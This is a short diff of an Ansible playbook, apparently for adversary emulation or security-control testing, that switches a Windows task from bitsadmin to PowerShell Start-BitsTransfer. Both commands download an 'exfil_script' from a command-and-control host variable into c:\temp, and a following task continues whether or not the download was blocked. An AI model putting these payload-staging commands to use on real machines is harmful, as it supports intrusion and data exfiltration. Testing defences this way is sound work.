@@ -8,10 +8,10 @@
       # If you want to use HTTPS, make sure remote certificate is valid or a add root ca if self-signed
       #become_user: SYSTEM
       tags: always
-      #win_shell: |
-      #  Start-BitsTransfer -Priority foreground -Source http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination c:\temp\{{ exfil_script_windows }}
-      win_command: |
-        bitsadmin.exe  /transfer /Download /priority Foreground http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} c:\temp\{{ exfil_script_windows }}
+      win_shell: |
+        Start-BitsTransfer -Priority foreground -Source http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination c:\temp\{{ exfil_script_windows }}
+      #win_command: |
+      #  bitsadmin.exe  /transfer /Download /priority Foreground http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} c:\temp\{{ exfil_script_windows }}
     - name: sleep for 10 seconds and continue with play if download was blocked or not
       tags: always
       wait_for: timeout=10
